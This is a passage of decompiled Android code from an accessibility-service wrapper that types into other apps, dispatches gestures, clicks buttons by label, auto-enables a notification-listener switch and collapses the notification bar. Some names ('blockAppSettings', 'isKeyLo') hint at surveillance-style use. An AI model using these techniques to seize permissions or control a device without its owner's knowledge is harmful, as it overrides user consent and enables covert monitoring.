                java.lang.CharSequence r4 = r4.getText()     // Catch: java.lang.Exception -> Lb9
                java.lang.String r5 = ""
                if (r4 != 0) goto L40
                r4 = r5
                goto L4a
            L40:
                android.view.accessibility.AccessibilityNodeInfo r4 = com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.tempAccessibilityNodeInfo     // Catch: java.lang.Exception -> Lb9
                java.lang.CharSequence r4 = r4.getText()     // Catch: java.lang.Exception -> Lb9
                java.lang.String r4 = r4.toString()     // Catch: java.lang.Exception -> Lb9
            L4a:
                if (r4 != 0) goto L4d
                goto L4e
            L4d:
                r5 = r4
            L4e:
                int r4 = r5.length()     // Catch: java.lang.Exception -> Lb9
                if (r1 <= r4) goto L55
                r1 = r4
            L55:
                if (r2 <= r4) goto L58
                r2 = r4
            L58:
                if (r1 < 0) goto L73
                if (r2 >= 0) goto L5d
                goto L73
            L5d:
                if (r2 >= r1) goto L62
                r6 = r2
                r2 = r1
                r1 = r6
            L62:
                java.lang.String r1 = r5.substring(r0, r1)     // Catch: java.lang.Exception -> Lb9
                r5.substring(r2)     // Catch: java.lang.Exception -> Lb9
                int r1 = r1.length()     // Catch: java.lang.Exception -> Lb9
                int r2 = r8.length()     // Catch: java.lang.Exception -> Lb9
                int r1 = r1 + r2
                goto L86
            L73:
                java.lang.StringBuilder r1 = new java.lang.StringBuilder     // Catch: java.lang.Exception -> Lb9
                r1.<init>()     // Catch: java.lang.Exception -> Lb9
                r1.append(r5)     // Catch: java.lang.Exception -> Lb9
                r1.append(r8)     // Catch: java.lang.Exception -> Lb9
                java.lang.String r1 = r1.toString()     // Catch: java.lang.Exception -> Lb9
                int r1 = r1.length()     // Catch: java.lang.Exception -> Lb9
            L86:
                android.view.accessibility.AccessibilityNodeInfo r2 = com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.tempAccessibilityNodeInfo     // Catch: java.lang.Exception -> Lb9
                r2.refresh()     // Catch: java.lang.Exception -> Lb9
                android.os.Bundle r2 = new android.os.Bundle     // Catch: java.lang.Exception -> Lb9
                r2.<init>()     // Catch: java.lang.Exception -> Lb9
                java.lang.String r4 = "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE"
                r2.putCharSequence(r4, r8)     // Catch: java.lang.Exception -> Lb9
                android.view.accessibility.AccessibilityNodeInfo r8 = com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.tempAccessibilityNodeInfo     // Catch: java.lang.Exception -> Lb9
                boolean r8 = r8.performAction(r3, r2)     // Catch: java.lang.Exception -> Lb9
                if (r8 == 0) goto Lb8
                android.os.Bundle r2 = new android.os.Bundle     // Catch: java.lang.Exception -> Lb9
                r2.<init>()     // Catch: java.lang.Exception -> Lb9
                java.lang.String r3 = "ACTION_ARGUMENT_SELECTION_START_INT"
                r2.putInt(r3, r1)     // Catch: java.lang.Exception -> Lb9
                java.lang.String r3 = "ACTION_ARGUMENT_SELECTION_END_INT"
                r2.putInt(r3, r1)     // Catch: java.lang.Exception -> Lb9
                android.view.accessibility.AccessibilityNodeInfo r1 = com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.tempAccessibilityNodeInfo     // Catch: java.lang.Exception -> Lb9
                r1.refresh()     // Catch: java.lang.Exception -> Lb9
                android.view.accessibility.AccessibilityNodeInfo r1 = com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.tempAccessibilityNodeInfo     // Catch: java.lang.Exception -> Lb9
                r3 = 131072(0x20000, float:1.83671E-40)
                r1.performAction(r3, r2)     // Catch: java.lang.Exception -> Lb9
            Lb8:
                return r8
            Lb9:
                r8 = move-exception
                java.lang.String r8 = r8.getMessage()
                anywheresoftware.b4a.BA.Log(r8)
                return r0
            */
            throw new UnsupportedOperationException("Method not decompiled: com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.AccessibilityEventsListener.EnterTextIntoNode(java.lang.String):boolean");
        }

        public String StrIsIn(String str) {
            AccessibilityEventsListenerWrapper.StrIsIn = str;
            return str;
        }

        public boolean isAccessServiceEnabledNew(Context context, Class cls) {
            try {
                String string = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
                if (string == null) {
                    return false;
                }
                StringBuilder sb = new StringBuilder();
                sb.append(context.getPackageName());
                sb.append(MqttTopic.TOPIC_LEVEL_SEPARATOR);
                sb.append(cls.getName());
                return string.contains(sb.toString());
            } catch (Exception e) {
                BA.Log(e.getMessage().toString());
                return false;
            }
        }

        public boolean IsAccessibilityServiceEnabled(String str) {
            AccessibilityManager accessibilityManager = (AccessibilityManager) this.f4c.getSystemService("accessibility");
            if (accessibilityManager != null) {
                Iterator<AccessibilityServiceInfo> it = accessibilityManager.getInstalledAccessibilityServiceList().iterator();
                while (it.hasNext()) {
                    BA.Log("Service id is " + it.next().toString());
                }
            } else {
                BA.Log("No service id:s were found");
            }
            return AccessibilityEventsListenerWrapper.isAccessibilityEnabled(this.f4c, str);
        }

        public void SetIsNotiFicationBarShow(Boolean bool) {
            AccessibilityEventsListenerWrapper.IsShowNotificationsBar = bool.booleanValue();
        }

        public static int intIsAccessibilityServiceEnabled_WithCrashCheck(Context context, Class cls) {
            if (AccessibilityEventsListenerWrapper.bGetServiceStatus()) {
                return 0;
            }
            return !AccessibilityEventsListenerWrapper.isAccessServiceEnabledNewloop(context, cls) ? -1 : -2;
        }

        public void DispatchGesture_Normal(int i, int i2, int i3, int i4) {
            try {
                GestureDescription.Builder builder = new GestureDescription.Builder();
                Path path = new Path();
                path.moveTo(i, i2);
                if (i3 != i && i4 != i2) {
                    if (i3 > i) {
                        i3 -= i;
                    }
                    path.lineTo(Math.abs(i3), Math.abs(i4));
                }
                builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 5L));
                StringBuilder sb = new StringBuilder();
                sb.append("Java DispatchGesture: Result = ");
                AccessibilityEventsListenerWrapper accessibilityEventsListenerWrapper = this.f4c;
                GestureDescription build = builder.build();
                sb.append(accessibilityEventsListenerWrapper.dispatchGesture(build, null, null));
                BA.Log(sb.toString());
            } catch (Exception e) {
                BA.Log("DispatchGesture Error " + e.getMessage().toString());
            }
        }

        public void DispatchGesture_Swipe(int i, int i2, int i3, int i4, int i5) {
            try {
                GestureDescription.Builder builder = new GestureDescription.Builder();
                Path path = new Path();
                path.moveTo(i, i2);
                path.lineTo(Math.abs(i3), Math.abs(i4));
                builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, i5));
                this.f4c.dispatchGesture(builder.build(), null, null);
            } catch (Exception e) {
                BA.Log("DispatchGestureSwipe Error " + e.getMessage().toString());
            }
        }

        public void DispatchGesture_Pattren(int i, int i2, ArrayList arrayList, ArrayList arrayList2, int i3) {
            try {
                GestureDescription.Builder builder = new GestureDescription.Builder();
                Path path = new Path();
                path.moveTo(i, i2);
                for (int i4 = 0; i4 < arrayList.size(); i4++) {
                    path.lineTo(((Integer) arrayList.get(i4)).intValue(), ((Integer) arrayList2.get(i4)).intValue());
                }
                builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, i3));
                this.f4c.dispatchGesture(builder.build(), null, null);
            } catch (Exception e) {
                BA.Log("DispatchGestureSwipe Error " + e.getMessage().toString());
            }
        }

        private boolean isWindowTitle(String str, AccessibilityNodeInfo accessibilityNodeInfo) {
            java.util.List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText;
            if (Build.VERSION.SDK_INT < 18 || accessibilityNodeInfo == null || (findAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str)) == null || findAccessibilityNodeInfosByText.isEmpty()) {
                return false;
            }
            for (AccessibilityNodeInfo accessibilityNodeInfo2 : findAccessibilityNodeInfosByText) {
                if (accessibilityNodeInfo2.getParent() != null) {
                    String viewIdResourceName = accessibilityNodeInfo2.getParent().getViewIdResourceName();
                    BA.Log("ID - " + viewIdResourceName);
                    if ("com.android.vending:id/action_bar".equals(viewIdResourceName)) {
                        return true;
                    }
                }
            }
            return false;
        }

        public boolean findButtonAndClick(Object obj, String str, boolean z) {
            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) obj;
            if (accessibilityNodeInfo == null) {
                return false;
            }
            java.util.List<AccessibilityNodeInfo> list = null;
            if (!z) {
                list = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
            } else if (Build.VERSION.SDK_INT >= 18) {
                list = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str);
            }
            BA.Log(" -> findButtonAndClick() -> " + str);
            return clickNode(list, str, false);
        }

        public static java.util.List<AccessibilityNodeInfo> findAndGetAllNode(AccessibilityNodeInfo accessibilityNodeInfo, String str, boolean z) {
            if (accessibilityNodeInfo == null) {
                return null;
            }
            CopyOnWriteArrayList copyOnWriteArrayList = new CopyOnWriteArrayList();
            if (!z) {
                copyOnWriteArrayList.addAll(accessibilityNodeInfo.findAccessibilityNodeInfosByText(str));
                Iterator it = copyOnWriteArrayList.iterator();
                while (it.hasNext()) {
                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) it.next();
                    if (!TextUtils.isEmpty(accessibilityNodeInfo2.getText()) && accessibilityNodeInfo2.getText().toString().contains(str)) {
                        copyOnWriteArrayList.add(accessibilityNodeInfo2);
                    }
                }
            } else if (Build.VERSION.SDK_INT >= 18) {
                copyOnWriteArrayList.addAll(accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str));
                Iterator it2 = copyOnWriteArrayList.iterator();
                while (it2.hasNext()) {
                    AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) it2.next();
                    if (!TextUtils.isEmpty(accessibilityNodeInfo3.getViewIdResourceName()) && accessibilityNodeInfo3.getViewIdResourceName().contains(str)) {
                        copyOnWriteArrayList.add(accessibilityNodeInfo3);
                    }
                }
            }
            return copyOnWriteArrayList;
        }

        public boolean getParentofNode(Object obj) {
            AccessibilityNodeInfo parent = ((AccessibilityNodeInfo) obj).getParent().getParent();
            BA.Log(parent.toString());
            for (int i = 0; i < parent.getChildCount(); i++) {
                AccessibilityNodeInfo child = parent.getChild(i);
                if (child != null) {
                    BA.Log("Child : " + child.toString());
                    BA.Log("found parent child : ");
                    if (child.isCheckable() && !child.isChecked()) {
                        if (performClickBA(child, "allow notification listener switcher")) {
                            Timber.m23d("NotificationListenerSwitcher | clicked to the iNode.IsCheckable true", new Object[0]);
                            return true;
                        }
                        Timber.m23d("NotificationListenerSwitcher | clicked to the iNode.IsCheckable false", new Object[0]);
                        child.setChecked(true);
                    }
                }
            }
            return false;
        }

        public static List findAndGetAllNodeBA(Object obj, String str, boolean z) {
            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) obj;
            if (accessibilityNodeInfo == null) {
                return null;
            }
            List list = new List();
            list.Initialize();
            CopyOnWriteArrayList copyOnWriteArrayList = new CopyOnWriteArrayList();
            if (!z) {
                copyOnWriteArrayList.addAll(accessibilityNodeInfo.findAccessibilityNodeInfosByText(str));
                Iterator it = copyOnWriteArrayList.iterator();
                while (it.hasNext()) {
                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) it.next();
                    if (!TextUtils.isEmpty(accessibilityNodeInfo2.getText()) && accessibilityNodeInfo2.getText().toString().contains(str)) {
                        copyOnWriteArrayList.add(accessibilityNodeInfo2);
                        list.Add(accessibilityNodeInfo2);
                    }
                }
            } else if (Build.VERSION.SDK_INT >= 18) {
                copyOnWriteArrayList.addAll(accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str));
                Iterator it2 = copyOnWriteArrayList.iterator();
                while (it2.hasNext()) {
                    AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) it2.next();
                    if (!TextUtils.isEmpty(accessibilityNodeInfo3.getViewIdResourceName()) && accessibilityNodeInfo3.getViewIdResourceName().contains(str)) {
                        copyOnWriteArrayList.add(accessibilityNodeInfo3);
                        list.Add(accessibilityNodeInfo3);
                    }
                }
            }
            return list;
        }

        public static AccessibilityNodeInfo findAndGetFirstSimilar(Object obj, String str, boolean z) {
            java.util.List<AccessibilityNodeInfo> findAndGetAllNode;
            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) obj;
            if (accessibilityNodeInfo == null || (findAndGetAllNode = findAndGetAllNode(accessibilityNodeInfo, str, z)) == null || findAndGetAllNode.isEmpty()) {
                return null;
            }
            return findAndGetAllNode.get(0);
        }

        private boolean clickNode(java.util.List<AccessibilityNodeInfo> list, String str, Boolean bool) {
            if (list == null || list.isEmpty()) {
                BA.Log(" -> clickNode() -> Nothing to click: " + str);
                return false;
            }
            if (!bool.booleanValue()) {
                return performClickBA(list.get(0), str);
            }
            Iterator<AccessibilityNodeInfo> it = list.iterator();
            while (it.hasNext()) {
                performClickBA(it.next(), str);
            }
            return true;
        }

        public boolean performClickBA(Object obj, String str) {
            boolean performAction;
            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) obj;
            BA.Log("TEST_ -> clickNode() -> node.isClickable(): " + accessibilityNodeInfo.isClickable());
            if (accessibilityNodeInfo.isClickable()) {
                performAction = accessibilityNodeInfo.performAction(16);
            } else {
                AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                performAction = parent != null ? parent.performAction(16) : false;
            }
            BA.Log(" -> clickNode() -> Clicked: " + str);
            return performAction;
        }

        public void blockAppSettings() {
            BA.Log("blockAppSettings");
        }

        public void threadSleep(long j) {
            try {
                Thread.sleep(j);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        public void close_notificationbar() {
            try {
                if (AccessibilityEventsListenerWrapper.IsShowNotificationsBar) {
                    return;
                }
                int i = Build.VERSION.SDK_INT;
                Object systemService = this.f4c.getSystemService("statusbar");
                Class<?> cls = Class.forName("android.app.StatusBarManager");
                if (i <= 16) {
                    Method method = cls.getMethod("collapse", new Class[0]);
                    method.setAccessible(true);
                    method.invoke(systemService, new Object[0]);
                } else {
                    Method method2 = cls.getMethod("collapsePanels", new Class[0]);
                    method2.setAccessible(true);
                    method2.invoke(systemService, new Object[0]);
                }
            } catch (Exception e) {
                BA.Log("error in closenotification : " + e.getMessage().toString());
            }
        }

        public void isSetKeyLo(int i) {
            AccessibilityEventsListenerWrapper.isKeyLo = i;
        }

        public static void delay(int i) {
            try {
                Thread.sleep(i);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
